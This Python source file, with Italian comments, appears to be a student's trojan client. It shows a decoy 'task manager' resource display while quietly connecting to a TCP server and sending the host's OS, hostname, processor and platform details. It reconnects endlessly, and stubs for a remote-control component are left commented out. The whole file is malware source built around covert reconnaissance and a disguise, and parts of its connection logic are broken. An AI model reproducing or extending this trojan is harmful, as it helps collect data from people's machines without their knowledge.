import os
from socket import *
import platform
import psutil
import time
import cpuinfo
import signal

IP="localhost"
PORT = 9090 #Porta di Ascolto del TCP
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"
FORMATWIN="windows-1252"
FORMATPDF="latin-1"

#comportamento da trojan
def trojanBehaviour():

    while True:
        cpu=psutil.cpu_percent()
        ram=psutil.virtual_memory().percent
        disk=psutil.disk_usage("/").percent
        processes_count=0
        print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
        print("              --     Task manager: Current state of usage      --\n\n")
        #facciamo un display a video dell'utilizzo
        print("              --------------------------------------------------------- ")
        print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
        print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),int(ram),int(disk),processes_count))
        print("              --------------------------------------------------------- ")
        time.sleep(1)
        clearScreen()


#gestisce il ctrl-C per l'uscita
def signalHandler(signum,frame):
    msg="Uscita effettuata con successo"
    print(":",msg,end="",flush=True)
    exit(1)

def sendInfo(client):
    # Info piattaforma
    mando = 1
    # Mando le informazioni raccolte al Server
    while mando == 1:
        try:
            infos = "OS: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release()
            client.send((str((len(infos)))).encode(FORMAT))
            client.send(((infos)).encode(FORMAT))
            mando = 0
        except:
            client.send(("[ERROR] Dati non mandati correttamente, riprovare? Y/N ").encode(FORMAT))
            risposta = client.recv(1024).decode(FORMAT)
            if risposta == "Y" or risposta == "y":
                mando = 1
            elif risposta == "N" or risposta == "n":
                mando = 0


def clientConnection():
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(ADDR)
        print(f"Connessione avvenuta")
        return client
    except:
        print(f"\nConnessione non riuscita: riprovo tra 10 secondi...")
        time.sleep(10)
        clientConnection()


def main():

        signal.signal(signal.SIGINT,signalHandler)
        client=clientConnection()
        print("Invio informazioni sul mio sistema al server")

        sendInfo(client)
        client.close()

        #remote control


    #start trojan
    #thread_trojan=Thread(target=trojanBehaviour)
    #thread_trojan.start()
    #thead_remoteControl=Thread(target=remoteControl)


if __name__ == "__main__":

    while True:
        try:
            main()
        except:
            print("Mi sto riconnetendo")